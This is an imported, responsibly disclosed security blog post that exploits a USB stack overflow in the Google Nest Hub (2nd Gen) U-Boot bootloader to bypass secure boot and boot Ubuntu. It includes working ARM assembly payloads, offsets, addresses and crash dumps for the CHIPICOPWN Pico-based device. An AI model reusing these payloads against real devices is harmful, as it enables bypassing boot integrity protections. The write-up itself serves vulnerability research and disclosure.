---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-06-15_breaking-secure-boot-on-google-nest-hub-2nd-gen-to-run-ubuntu.md
original_filename: 2022-06-15_breaking-secure-boot-on-google-nest-hub-2nd-gen-to-run-ubuntu.md
title: Breaking Secure Boot on Google Nest Hub (2nd Gen) to run Ubuntu
category: documents
detected_topics:
- sso
- idor
- command-injection
- rate-limit
- automation-abuse
- api-security
tags:
- imported
- documents
- sso
- idor
- command-injection
- rate-limit
- automation-abuse
- api-security
language: en
raw_sha256: c4747543de7ce44e53041e834291c1c34dee76e14162b26d02ad28501082ff5a
text_sha256: fd34bf6d6c1c52b08ff73567fe8ffb59a9557bd8f31d1defe0952e6aad85749c
ingested_at: '2026-06-28T07:32:12Z'
sensitivity: unknown
redactions_applied: false
---

# Breaking Secure Boot on Google Nest Hub (2nd Gen) to run Ubuntu

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-06-15_breaking-secure-boot-on-google-nest-hub-2nd-gen-to-run-ubuntu.md
- Source Type: markdown
- Detected Topics: sso, idor, command-injection, rate-limit, automation-abuse, api-security
- Ingested At: 2026-06-28T07:32:12Z
- Redactions Applied: False
- Raw SHA256: `c4747543de7ce44e53041e834291c1c34dee76e14162b26d02ad28501082ff5a`
- Text SHA256: `fd34bf6d6c1c52b08ff73567fe8ffb59a9557bd8f31d1defe0952e6aad85749c`


## Content

---
title: "Breaking Secure Boot on Google Nest Hub (2nd Gen) to run Ubuntu"
page_title: "fred's notes – Breaking Secure Boot on Google Nest Hub (2nd Gen) to run Ubuntu"
url: "https://fredericb.info/2022/06/breaking-secure-boot-on-google-nest-hub-2nd-gen-to-run-ubuntu.html"
final_url: "https://fredericb.info/2022/06/breaking-secure-boot-on-google-nest-hub-2nd-gen-to-run-ubuntu.html"
authors: ["Frédéric Basse (@FredoBasse)"]
programs: ["Google"]
bugs: ["Hardware hacking", "Memory corruption"]
publication_date: "2022-06-15"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2548
---

# Breaking Secure Boot on Google Nest Hub (2nd Gen) to run Ubuntu

Posted on Wed 15 June 2022 in [Article](https://fredericb.info/category/article.html)

In this post, we attack the Nest Hub (2nd Gen), an always-connected smart home display from Google, in order to boot a custom OS.

First, we explore both hardware and software attack surface in search of security vulnerabilities that could permit arbitrary code execution on the device.

Then, using a [Raspberry Pi Pico microcontroller](https://www.raspberrypi.com/products/raspberry-pi-pico/), we exploit an USB bug in the bootloader to break the secure boot chain.

Finally, we build new bootloader and kernel images to boot a custom OS from an external flash drive.

![Booting Ubuntu on Google Nest Hub \(2nd Gen\) using CHIPICOPWN](https://fredericb.info/blog/elaine/chipicopwn.gif)

# Disclaimer

You are solely responsible for any damage caused to your hardware/software/keys/DRM licences/warranty/data/cat/etc...

# 1\. Hardware exploration

## Virtual tour

Overviews of internal hardware published on [FFC ID website](https://fccid.io/A4RGUIK2/Internal-Photos/Internal-Photos-20200702-v1-Internal-Photos-5035937) and [Electronics360](https://electronics360.globalspec.com/article/17053/teardown-google-nest-hub-2nd-gen) indicate the device is based on Amlogic S905D3G SoC.

![External photo from FCC.IO](https://fredericb.info/blog/elaine/elaine.usb.port.png)

They also reveal the existence of one USB port hidden underneath the device. Not a feature for users, so a priority for us. Especially since we already [discovered and exploited an USB vulnerability in the same chipset](https://fredericb.info/2021/02/amlogic-usbdl-unsigned-code-loader-for-amlogic-bootrom.html).

Good enough, let's buy one. The oldest one, always... Conveniently, manufacturing date is on box : December 2020.

## Nice try but no

The first thing to check once we have the device in hands is if the [known USB vulnerability](https://fredericb.info/2021/02/amlogic-usbdl-unsigned-code-loader-for-amlogic-bootrom.html) has been fixed. Doing so requires to boot the SoC in USB Download mode by holding a combination of buttons. After trying few random combinations, a new USB device is detected by our host, which indicates we found the right combination : Volume UP + Volume DOWN. We can then try to use the exploitation tool [amlogic-usbdl](https://github.com/frederic/amlogic-usbdl).

Unfortunately (for us), the tool detects that the device is password-protected, so we can't exploit this bug.

However, while attempting to trigger USB Download mode, we noticed few other button combinations that prevent the device to fully boot (stuck on boot logo). We keep that in mind since a boot flow change can also mean attack surface change.

## Mysterious wires

After looking closely at the USB port, we notice that both USB and power supply connectors are on a separate module, which is connected to the main board via a 16-pin [Flexible Flat Cable (FFC)](https://en.wikipedia.org/wiki/Flexible_flat_cable).

![USB/DC board](https://fredericb.info/blog/elaine/elaine.USB-DC.board.png)

That's a lot of wires for only one micro-USB 2.0 (5 pins) & one power supply (2 pins).

Such flat cable, accessible without dissassembly and offering extra wires (apparently) unused, evokes a hidden cability to connect a _developer_ board with additionnal interfaces (UART ? JTAG ? SDCARD ?) for development or repair purposes.

In order to uncover potential other interfaces, we first identify the pins associated with USB and power supply using a multimeter :

  * Power supply connector to FFC : 11 pins! ouch...
  * USB connector to FFC : 3 pins (No USB +5V)

With 14 pins identified, only 2 are left.

The voltage measured on these 2 pins during boot is constant near-0V for the first one, and fluctuating between 0V and 3.3V for the second. This pattern matches an UART port.

We now have the complete pinout of the flexible flat cable :

PIN | FUNCTION | PIN | FUNCTION | PIN | FUNCTION | PIN | FUNCTION  
---|---|---|---|---|---|---|---  
1 | GND | 5 | GND | 9 | VCC | 13 | USB-D-  
2 | GND | 6 | VCC | 10 | VCC | 14 | USB-D+  
3 | UART-TX | 7 | VCC | 11 | VCC | 15 | GND  
4 | UART-RX | 8 | VCC | 12 | GND | 16 | USB-ID  
  
## DIY debug board

We take advantage of the accessible FFC to connect a breakout board with the right FCC connector : 16-pin, 0.5mm pitch.

Several options exist:

  * Presoldered [16-pin 0.5mm FFC board](https://www.aliexpress.com/item/32923333053.html) : hard to find except in China.
  * Presoldered 0.5mm FFC board with more pins (i.e [24-pin](https://smile.amazon.com/gp/product/B07RWMSVNH)) : very dangerous if connections are shifted.
  * Solder the [right connector](https://www.digikey.com/en/products/detail/molex/0528921633/4444660) on a [breakout board](https://tinkersphere.com/cables-wires/3643-16-pin-05mm-1mm-pitch-fpc-to-dip-breakout.html) : the solution we opted for.

![16 Pin 0.5mm & 1mm pitch FPC to DIP Breakout](https://fredericb.info/blog/elaine/board.FPC.16P_0.5mm.png)

![DIY debug board for Google Nest Hub](https://fredericb.info/blog/elaine/elaine.debug.board.png)

This board provides a convenient access to UART, USB and power supply.

## UART port

Using our debug board, we connect an USB-to-Serial adapter to the UART port to obtain logs during boot :
  
  
  SM1:BL:511f6b:81ca2f;FEAT:A28821B2:202B3000;POC:F;EMMC:0;READ:0;CHK:1F;READ:0;0.0;0.0;CHK:0;
  bl2_stage_init 0x01
  [...]
  BL2 Built : 20:46:51, Dec 10 2020. \ng12a g3d61890 - user@host
  [...]
  U-Boot 2019.01-gbfc19012ea-dirty (Dec 11 2020 - 04:19:32 )
  
  DRAM:  2 GiB
  board init
  [...]
  MUTE engaged
  VOL_UP not pressed
  upgrade key not pressed
  reboot_mode:cold_boot
  cold_boot
  aml log : boot from nand or emmc
  Kernel decrypted
  kernel verify: success
  [...]
  Starting kernel ...
  

We can see bootloader and U-Boot logs, kernel image seems encrypted, but no more logs once Linux has started though.

We also see that button states are checked ("MUTE engaged", "VOL_UP not pressed"), and that "upgrade key not pressed". This is really intriguing since any new feature we discover could represent a new attack surface.

We try to boot again, this time while holding both volume buttons (volume down & volume up) :
  
  
  [...]
  U-Boot 2019.01-gbfc19012ea-dirty (Dec 11 2020 - 04:19:32 )
  [...]
  MUTE engaged
  VOL_UP pressed
  VOL_DN pressed
  detect VOL_UP pressed
  VOL_DN pressed
  resetting USB...
  USB0:  Register 3000140 NbrPorts 2
  Starting the controller
  USB XHCI 1.10
  scanning bus 0 for devices... 3 USB Device(s) found
  scanning usb for storage devices... 2 Storage Device(s) found
  ** Unable to read file recovery.img **
  resetting USB...
  

When booted this way, the Nest Hub tries to load a file named _recovery.img_ from an USB flash drive. Attack surface just increased.

# 2\. Software exploration

While official firmware images for Nest Hub are not publicly available, the [source code for the bootloader (U-Boot) and the kernel (Linux) has been released by Google](https://drive.google.com/file/d/1euEvmbInWddUFAhMhHe628WAnpdYpGIa/view?usp=sharing) thanks to the GPL license.

## Mysterious USB recovery feature

We start by investigating the recovery mechanism we spotted earlier as it happens to be interesting for several reasons:

  * Implemented in U-Boot so open source : easy to study.
  * Apparently meant to run a recovery boot image : exactly what we want to achieve, but is it signed ?
  * A lot of code involved : USB, Mass Storage device, partition table, filesystem, boot image parsing, boot image signature verification (if any). Bugs in these layers could lead to arbitrary code execution.
  * Data is loaded from external USB source : no need to disassemble the device.

To quickly locate this feature in U-Boot source tree, we grep _recovery.img_. We find a function named **recovery_from_udisk** in U-Boot environment :
  
  
  "recovery_from_udisk=" \
  "while true ;do " \
  "usb reset; " \
  "if fatload usb 0 ${loadaddr} recovery.img; then "\
  "bootm ${loadaddr};" \
  "fi;" \
  "done;" \
  "\0" \
  

First, this code resets the USB subsystem. Then, it calls the **fatload** function to load a boot image named _recovery.img_ in memory at address _loadaddr_. Finally, it tries to boot the loaded data using function **bootm**.

We can also confirm that function **recovery_from_udisk** is run when both volume buttons are held (GPIOZ_5 & GPIOZ_6) :
  
  
  "upgrade_key=" \
  "if gpio input GPIOZ_5; then " \
  "echo detect VOL_UP pressed;" \
  "if gpio input GPIOZ_6; then " \
  "echo VOL_DN pressed;" \
  "setenv boot_external_image 1;" \
  "run recovery_from_udisk;" \
  [...]
  

This recovery feature is an ideal mechanism to boot an alternative OS. However, a quick look at **bootm** function reveals it systematically verifies _recovery.img_ signature by calling function **aml_sec_boot_check**.

To boot a custom OS using this mechanism, we first have to find a bug that could bypass this verification.

## Bug hunt

The recovery feature enables USB interface as an attack vector. As a result, any code that processes data coming from USB interface becomes a potential (software) attack surface.

This attack surface can be roughly estimated by exploring the call flow triggered by the recovery feature :

![USB Mass Sstorage attack surface in U-Boot](https://fredericb.info/blog/elaine/uboot-cfg.png)

  * **usb reset** exposes the USB driver when it performs USB enumeration.
  * **fatload** exposes several drivers : USB, Mass Storage, DOS partition, FAT filesystem.
  * **bootm** attack surface is very limited since it starts by calling the signature verification routine **aml_sec_boot_check** , which cannot be reviewed because it's implemented in TrustZone (no source code or binary available at this moment).

The attack surface exposed by **fatload** command is obviously the most interesting target due to the amount of code involved and its complexity.

While [previous research](https://forallsecure.com/blog/forallsecure-uncovers-critical-vulnerabilities-in-das-u-boot) found issues in [DOS partition parser](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13103) and [EXT4](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13104) [filesystem](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13105) [parser](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13106), we could not find public evidence of vulnerabilty research on U-Boot FAT filesystem, which makes it an ideal target to begin with.

U-Boot implements a _sandbox_ architecture that allows it to run as a Linux user-space application. This feature is a convenient starting point to build a fuzzer for U-Boot code.

We build a fuzzing harness that injects data in **blk_dread** (function that reads data from a block device), and triggers execution by calling **fat_read_file**. The harness must also initialize the state that is expected by these functions : USB enumeration done, block device detected, partitions have been parsed (in real conditions, this initialization would have been performed by **fs_set_blk_dev**). Fuzzing is performed by [AFL](https://github.com/google/AFL) and [libFuzzer](https://llvm.org/docs/LibFuzzer.html). This first fuzzing attempt uncovered few [circular reference](https://en.wikipedia.org/wiki/Circular_reference) issues in FAT cluster chains that caused the code to loop indefinitely. While being painful to fix, they're not the kind of bugs we're looking for.

In a second phase, we extend the fuzzing to the initialized state since some parameters can be controlled by the attacker. For example, the USB Mass Storage driver sets [multiple parameters](https://github.com/u-boot/u-boot/blob/28c2ebef372b4c9bb18bed8373e0d9e65a09b42b/common/usb_storage.c#L1421) in [structure blk_desc](https://github.com/u-boot/u-boot/blob/28c2ebef372b4c9bb18bed8373e0d9e65a09b42b/include/blk.h#L67) that describe the detected block device in initialized state.

One of them is the block size (_blk_desc.blksz_) of the block device (which is an USB flash drive in our case). This value is obtained from the block device by sending command [READ CAPACITY](https://github.com/u-boot/u-boot/blob/28c2ebef372b4c9bb18bed8373e0d9e65a09b42b/common/usb_storage.c#L1051), which means attacker controls it.

Block size is an important parameter for upper layers like partition and filesystem drivers. Messing with it led to an interesting crash :
  
  
  $ ./fuzz
  INFO: Seed: 473398954
  INFO: Loaded 1 modules  (1402 inline 8-bit counters): 1402 [0x5aa0c0, 0x5aa63a), 
  INFO: Loaded 1 PC tables (1402 PCs): 1402 [0x57ada0,0x580540), 
  =================================================================
  ==5892==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffe6db4bb3f at pc 0x0000004f16af bp 0x7ffe6db4b790 sp 0x7ffe6db4af40
  WRITE of size 32768 at 0x7ffe6db4bb3f thread T0
  #0 0x4f16ae in __asan_memset (/u-boot-elaine/fuzzer/fuzz+0x4f16ae)
  #1 0x55a8cf in blk_dread /u-boot-elaine/fuzzer/blk.c:153:13
  #2 0x5284b1 in part_test_dos /u-boot-elaine/disk/part_dos.c:96:6
  #3 0x521f52 in part_init /u-boot-elaine/disk/part.c:242:9
  #4 0x55b494 in usb_stor_probe_device /u-boot-elaine/fuzzer/usb_storage.c:41:5
  #5 0x55b648 in LLVMFuzzerTestOneInput /u-boot-elaine/fuzzer/fuzz.c:42:5
  #6 0x42ee1a in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/u-boot-elaine/fuzzer/fuzz+0x42ee1a)
  #7 0x43052a in fuzzer::Fuzzer::ReadAndExecuteSeedCorpora(std::vector<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >, fuzzer::fuzzer_allocator<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > > > const&) (/u-boot-elaine/fuzzer/fuzz+0x43052a)
  #8 0x430bf5 in fuzzer::Fuzzer::Loop(std::vector<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >, fuzzer::fuzzer_allocator<std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > > > const&) (/u-boot-elaine/fuzzer/fuzz+0x430bf5)
  #9 0x426e00 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/u-boot-elaine/fuzzer/fuzz+0x426e00)
  #10 0x44a412 in main (/u-boot-elaine/fuzzer/fuzz+0x44a412)
  #11 0x7b733912f09a in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2409a)
  #12 0x420919 in _start (/u-boot-elaine/fuzzer/fuzz+0x420919)
  
  Address 0x7ffe6db4bb3f is located in stack of thread T0 at offset 607 in frame
  #0 0x5282ff in part_test_dos /u-boot-elaine/disk/part_dos.c:90
  
  This frame has 1 object(s):
  [32, 607) '__mbr' (line 92) <== Memory access at offset 607 overflows this variable
  

AddressSanitizer detected a stack buffer overflow in **part_test_dos**. This function is called to detect a DOS partition table when an USB Mass Storage device is connected.

It is interesting to note that, while the crash occurs in DOS partition layer, the invalid size at the origin of the crash is set by the USB Mass Storage layer. This suggests that it is unlikely to find this bug if layers are fuzzed independently.

## U-Boot stack overflow

The crash is caused by a simple bug in function **part_test_dos** :
  
  
  static int part_test_dos(struct blk_desc *dev_desc)
  {
  [...]
  (1)  ALLOC_CACHE_ALIGN_BUFFER(legacy_mbr, mbr, 1);
  
  (2)  if (blk_dread(dev_desc, 0, 1, (ulong *)mbr) != 1)
  

  1. Buffer _mbr_ of 512 bytes (**sizeof**(_legacy_mbr_)) is allocated on the stack.
  2. Function **blk_dread** reads 1 block at address 0 from block device _dev_desc_ and writes data to buffer _mbr_. 

If block size (_dev_desc- >blksz_) is larger than 512, function **blk_dread** overflows buffer _mbr_.

As said before, block size can be controlled by attacker. But in practice, most USB flash drives have a block size of 512 bytes, and it cannot be customized easily. Let's build one instead.

# 3\. Exploitation device : CHIPICOPWN

In order to exploit this bug in the Nest Hub bootloader, we need an USB Mass Storage device that supports larger-than-usual block size. One solution could be based on the [Mass Storage Gadget from Linux USB Gadget framework](https://www.kernel.org/doc/html/latest/usb/mass-storage.html) with an USB OTG-enabled host (e.g. [VIM3L SBC](https://www.khadas.com/vim3l) we used to [dump the S905D3 bootROM](https://fredericb.info/2021/02/dump-amlogic-s905d3-bootrom-from-khadas-vim3l-board.html). But there's a cheaper option.

[Raspberry Pi Pico](https://www.raspberrypi.com/products/raspberry-pi-pico/) is a $4 microcontroller with USB Device support. It also has the great advantage of being supported by [TinyUSB, an open-source cross-platform USB Host/Device stack](https://github.com/hathach/tinyusb).

![Raspberry Pi Pico board](https://fredericb.info/blog/elaine/rpi-pico-board-front.png)

TinyUSB project provides a [Mass Storage device example code](https://github.com/hathach/tinyusb/tree/master/examples/device/cdc_msc) that can turn a Raspberry Pi Pico into a customizable USB flash drive. From this starting point, we can build an exploitation device that will :

  * inject payload into stack memory
  * overwrite return address to execute payload
  * display a cool logo

However, due to the _black-box_ approach (no access to firmware), we still miss important information to develop the exploit. We'll go through several steps to collect all the information required to craft our final payload.

## 3.1 Proof-of-Crash

We start by verifying if the device is actually vulnerable to the bug. Using the [Mass Storage device example code](https://github.com/hathach/tinyusb/tree/4bfab30c02279a0530e1a56f4a7c539f2d35a293/examples/device/cdc_msc) as starting point, we [change the block size to 1024 instead of 512](https://github.com/frederic/chipicopwn/commit/c576f382b6ada027aab592ede525db1405f79cf4) to confirm if we observe a crash.

When connected to our host, the Raspberry Pi Pico is now detected as Mass Storage with _"1024-byte logical blocks"_ :
  
  
  usb 1-2: New USB device found, idVendor=cafe, idProduct=4003, bcdDevice= 1.00
  usb 1-2: New USB device strings: Mfr=1, Product=2, SerialNumber=3
  usb 1-2: Product: TinyUSB Device
  usb 1-2: Manufacturer: TinyUSB
  usb 1-2: SerialNumber: 123456789012
  usb-storage 1-2:1.0: USB Mass Storage device detected
  scsi host0: usb-storage 1-2:1.0
  scsi host0: scsi scan: INQUIRY result too short (5), using 36
  scsi 0:0:0:0: Direct-Access  TinyUSB  Mass Storage  1.0  PQ: 0 ANSI: 2
  sd 0:0:0:0: Attached scsi generic sg0 type 0
  sd 0:0:0:0: [sda] 16 1024-byte logical blocks: (16.4 kB/16.0 KiB)
  sd 0:0:0:0: [sda] Write Protect is off
  sd 0:0:0:0: [sda] Mode Sense: 03 00 00 00
  sd 0:0:0:0: [sda] No Caching mode page found
  sd 0:0:0:0: [sda] Assuming drive cache: write through
  sda:
  sd 0:0:0:0: [sda] Attached SCSI removable disk
  

When connected to the device booted in recovery mode, the Pico causes an exception, and registers are dumped over UART :
  
  
  "Synchronous Abort" handler, esr 0x02000000
  elr: ffffffff8110e000 lr : ffffffff8110e000 (reloc)
  elr: 0000000000000000 lr : 0000000000000000
  x0 : 0000000000000002 x1 : 0000000000000000
  x2 : 0000000000000000 x3 : 0000000000000000
  x4 : 000000007bed5b00 x5 : fffffffffffffff8
  x6 : 0000000000000000 x7 : 0000000000000000
  x8 : 0000000000000001 x9 : 0000000000000008
  x10: 000000007c0021b0 x11: 000000007c009b80
  x12: 0000000000000001 x13: 0000000000000001
  x14: 000000007bed5c4c x15: 00000000ffffffff
  x16: 0000000000004060 x17: 0000000000000084
  x18: 000000007bee1dc8 x19: 0000000000000000
  x20: 0000000000000000 x21: 0000000000000000
  x22: 000000000000002a x23: 000000007c008490
  x24: 000000007c008490 x25: 000000007ffdcd80
  x26: 0000000000000000 x27: 0000000000000000
  x28: 000000007c009ac0 x29: 0000000000000000
  
  Resetting CPU ...
  

This indicates with great certainty that the device is vulnerable to our bug. Register values will be very helpful to develop the exploit. Unfortunately, _sp_ register value is missing, so we'll have to do extra work to locate our payload in the stack. Still, we have obtained the global data pointer _gd_ which is [stored in register _x18_](https://u-boot.readthedocs.io/en/latest/develop/global_data.html). And we can learn from U-Boot source code that stack top is located below _gd_.

## 3.2 Offset of payload address

The bug allows to overflow a buffer on the stack to overwrite a return address. First, we look for the offset in our payload that will overwrite that return address. For that, we create a [payload filled with incremental invalid pointers](https://github.com/frederic/chipicopwn/blob/main/payloads/poc_step1.S) :
  
  
  .text
  .global _start
  
  _start:
  .word 0xFFFFFC00
  .word 0xFFFFFC01
  .word 0xFFFFFC02
  [...]
  .word 0xFFFFFFFF
  

Then, we [modify the Pico code](https://github.com/frederic/chipicopwn/commit/42ced2f16d4c7f64f74d6d6d13e93d85a72c8ba7) to use this payload as the block 0 of the block device. The device crashes again :
  
  
  "Synchronous Abort" handler, esr 0x8a000000
  elr: fffffc8f8110dc8e lr : fffffc8f8110dc8e (reloc)
  elr: fffffc8ffffffc8e lr : fffffc8ffffffc8e
  x0 : 00000000ffffffff x1 : 0000000000000001
  x2 : 000000007bed5888 x3 : 0000000000000000
  x4 : 0000000000001000 x5 : 0000000000000200
  x6 : fffffffffffffffe x7 : 0000000000000000
  x8 : 0000000000000001 x9 : 0000000000000008
  x10: 000000007c0021b0 x11: 000000007c009b80
  x12: 0000000000000001 x13: 0000000000000001
  x14: 000000007bed5c4c x15: 00000000ffffffff
  x16: 0000000000004060 x17: 0000000000000084
  x18: 000000007bee1dc8 x19: fffffc91fffffc90
  x20: fffffc93fffffc92 x21: fffffc95fffffc94
  x22: 000000000000002a x23: 000000007c008490
  x24: 000000007c008490 x25: 000000007ffdcd80
  x26: 0000000000000000 x27: 0000000000000000
  x28: 000000007c009ac0 x29: fffffc8dfffffc8c
  
  Resetting CPU ...
  

We can notice that the link register _lr_ contains an invalid pointer : fffffc8ffffffc8e. We recognize values 0xFFFFFC8E and 0xFFFFFC8F from our payload. This means the offset is 0x238 (0x8e * 4 bytes).

## 3.3 Payload address

We can now redirect code execution to an arbitrary address specified at offset 0x238 in our payload. The next step is to determine the start address of this payload to finally execute it.

We create a [large payload](https://github.com/frederic/chipicopwn/blob/main/payloads/poc_step2.S) (maximum allowed block size is 0x8000) filled with many branch instructions that all lead to few instructions at the very end.

If we manage to guess the address of any of these 8,185 branch instructions, the payload will be executed. And we have a major hint : we already know that stack top is located below _gd_ address (register _x18_).

One educated guess is : (gd - 0x8000) = (0x7bee1dc8 - 0x8000) = **0x7BED9DC8**.
  
  
  .text
  .global _start
  
  _start:
  b _payload
  b _payload
  [...]
  .dword 0x7BED9DC8 // payload pointer at offset 0x238
  [...]
  b _payload
  b _payload
  _payload:
  adr x19, _start
  mov x20, x30
  mov x21, sp
  mov x22, #0xcafe
  blr x13
  

The first instruction _adr_ sets register _x19_ to the payload's start address. The last instruction _blr_ branches to an invalid pointer _x13_ to ensure a crash, and thus dump registers on UART.

We [modify the Pico code](https://github.com/frederic/chipicopwn/commit/e118c46355d35d8ef40450fcbee2ca2ccb49ffb2) to use this new payload. The device crashes again :
  
  
  "Synchronous Abort" handler, esr 0x8a000000
  elr: ffffffff8110e001 lr : fffffffffcfeb700 (reloc)
  elr: 0000000000000001 lr : 000000007bedd700
  x0 : 00000000ffffffff x1 : 0000000000000001
  x2 : 000000007bed5888 x3 : 0000000000000000
  x4 : 0000000000008000 x5 : 0000000000000200
  x6 : d63f01a0d2995fd6 x7 : 0000000000000000
  x8 : 0000000000000001 x9 : 0000000000000008
  x10: 000000007c0021b0 x11: 000000007c009b80
  x12: 0000000000000001 x13: 0000000000000001
  x14: 000000007bed5c4c x15: 00000000ffffffff
  x16: 0000000000004060 x17: 0000000000000084
  x18: 000000007bee1dc8 x19: 000000007bed5700
  x20: 000000007bed9dc8 x21: 000000007bed5960
  x22: 000000000000cafe x23: 000000007c008490
  x24: 000000007c008490 x25: 000000007ffdcd80
  x26: 0000000000000000 x27: 0000000000000000
  x28: 000000007c009ac0 x29: 14001f6e14001f6f
  
  Resetting CPU ...
  

Register _x22_ contains the flag that indicates the payload was executed successfully. And _x19_ reveals that payload's start address is **0x7bed5700**.

To summarize, the exploit requires an USB Mass Storage device with :

  * block size of 1024, 2048, 4096, 8192, 16384 or 32768 bytes
  * payload contained in block 0
  * value 0x000000007bed5700 set at offset 0x238 in block 0

## 3.4 Dumping running bootloader

We can now execute arbitrary code. But developing a baremetal payload that loads an alternative bootloader/OS from an USB flash drive is a bit tricky. Instead, it would be easier to directly call the bootloader code already in memory. But to do so, we must first obtain the bootloader.

We create a [payload that dumps RAM memory over UART](https://github.com/frederic/chipicopwn/blob/main/payloads/memdump_over_uart.c). The information required to control the UART (registers, addresses) is obtained from U-Boot source code.

First, we dump the [_gd_ structure](https://github.com/u-boot/u-boot/blob/master/include/asm-generic/global_data.h) (register _x18_), because it contains a pointer to the bootloader code in RAM :

![Dumped U-Boot gd structure](https://fredericb.info/blog/elaine/struct_gd_dump.png)

Variable _gd- >relocaddr_ indicates that the bootloader is at **0x7fef2000**. We dump memory from this address up to _gd- >ram_top_.

## 3.5 Final payload

With the bootloader image in hands, we can design a payload that relies on bootloader functions. We use [Ghidra](https://ghidra-sre.org/) to get the address of function [run_command_list](https://github.com/u-boot/u-boot/blob/3918376e91dac7711cf04bd06f8de80e797edfea/common/cli.c#L84), which gives us access to U-Boot built-in commands.
  
  
  .text
  .global _start
  _start:
  sub sp, sp, #0x1000 // move SP below us to avoid being overwritten when calling functions
  ldr x0, _bug_ptr
  ldr x1, _bug_fix
  str x1, [x0]  // fix the bug we just exploited
  adr x0, _command_list
  mov w1, #0xffffffff
  mov w2, #0x0
  ldr x30, _download_buf // set LR to download buffer
  ldr x3, _run_command_list // load binary into download buffer
  br x3
  
  _bug_ptr: .dword 0x7ff26060
  _bug_fix: .dword 0xd65f03c0d2800000
  _download_buf: .dword 0x01000000
  _run_command_list: .dword 0x7ff24720
  _command_list: .asciz "echo CHIPICOPWN!;osd setcolor 0x1b0d2b0d;usb reset;fatload usb 0 0x8000000 CHIPICOPWN.BMP;bmp display 0x8000000;while true;do usb reset;if fatload usb 0 0x01000000 u-boot-elaine.bin;then echo yolo;exit;fi;done;"
  

This final payload :

  * fixes (in RAM) the bug we just exploited
  * calls U-Boot function [run_command_list](https://github.com/u-boot/u-boot/blob/3918376e91dac7711cf04bd06f8de80e797edfea/common/cli.c#L84) with __command_list_ as argument
  * sets the download buffer (0x01000000) as return address to execute next stage (if any)

The U-Boot commands in __command_list_ load 2 files from the first FAT partition of USB Mass Storage device :

  * _CHIPICOPWN.BMP_ : the logo to display
  * _u-boot-elaine.bin_ : the next payload to run. In our case, a custom U-Boot image.

Once function _run_command_list_ returns, the next payload is executed.

Since Rasperry Pi Pico flash memory is limited, we can put the file _u-boot-elaine.bin_ on another USB flash drive that is hot-swapped with the Pico.

The [source code & prebuilt Pico binary with this final payload are available on GitHub](https://github.com/frederic/chipicopwn).

![CHIPICOPWN booted on Google Nest Hub](https://fredericb.info/blog/elaine/chipicopwn-boot.png)

# 4\. Booting Ubuntu from USB

We can now boot an unsigned OS thanks to the exploitation tool. As a proof-of-concept, we make a bootable USB flash drive based on the [preinstalled Ubuntu image for Raspberry Pi Generic (64-bit ARM)](https://cdimage.ubuntu.com/releases/22.04/release/). Since this Ubuntu image is designed for another target, we must change few things to get it to boot :

We build a [custom U-Boot bootloader](https://github.com/frederic/elaine-u-boot) with [secure boot disabled](https://github.com/frederic/elaine-u-boot/commit/171be963a57cf089d15f6c4f2aa4ffb81d445d1b) and [boot flow altered to load environment from USB flash drive](https://github.com/frederic/elaine-u-boot/commit/7d4ec4f68dc7bdca32511222ff1ed31b30b8f899). We also build a [custom Linux kernel for elaine](https://github.com/frederic/elaine-linux) with [additionnal drivers like USB mouse](https://github.com/frederic/elaine-linux/commit/11068237d9178e77d79e3a5d27fc4f8f9b923c51). The initial ramdisk (initrd) from Ubuntu is [repacked](https://github.com/frederic/elaine-bootimg#ramdisk-details) to integrate firmware binaries required for the touchscreen. The boot image is [created](https://github.com/frederic/elaine-bootimg/blob/main/mkbootimg.sh) based on the custom Linux kernel and modified initrd.

All these files are copied to the Ubuntu flash drive. [They are available on GitHub, as well as a step-by-step guide.](https://github.com/frederic/chipicopwn)

![Ubuntu booted on Google Nest Hub](https://fredericb.info/blog/elaine/elaine-ubuntu.png)

# Conclusion

Hardware exploration led to uncovering an unexpected USB port. Software exploration revealed that it can boot from an USB Mass Storage device. Bug hunting exposed a stack overflow vulnerability in the DOS partition parser.

As a result, an attacker can execute arbitrary code at early boot stage (before kernel execution) by plugging a malicious USB device and pressing two buttons.

Several changes could have reduced the security risk.

At hardware level, the USB port — which is of no use to users — facilitates the attack. While removing external access to the USB interface doesn't fix the issue, it would require the attacker to fully disassemble the device, thereby increasing the time required to perform the attack.

At software level, attack surface can be reduced by not relying on partition or filesystem layers in the recovery feature. Instead, U-Boot could have read the recovery image from the raw block device (just like some BL1s read BL2 image).

Regarding the vulnerability itself, it shouldn't even exist since it's already been fixed upstream, twice :

  * [Bug introduced on 2002-11-02](https://github.com/u-boot/u-boot/commit/fe8c2806cdba70479e351299881a395dc2be7785)
  * [Fixed on 2011-07-27](https://github.com/u-boot/u-boot/commit/54193c5d8133f4f35267f412e5c1bbcbc6ac041c)
  * [Bug reintroduced on 2018-02-07](https://github.com/u-boot/u-boot/commit/8639e34d2c5e12cc2e45c95b1a2e97c22bf6a711)
  * [Fixed 2019-09-19](https://github.com/u-boot/u-boot/commit/7aed3d380981565b5bb2810d5d13aad1ff994f1a)

The lack of CVE may explain why it hasn't been propagated downstream.

Finally, mitigations in U-Boot, like stack canary or ASLR, could have made exploitation way harder, especially considering the _black-box_ approach.

# Timeline

  * 2021-10-28 : Attack vector doesn't qualify for Pwn2Own 2021
  * 2021-11-01 : Vulnerability disclosed to Google
  * 2021-12 : Security update released by Google
  * 2022-06-15 : Public disclosure

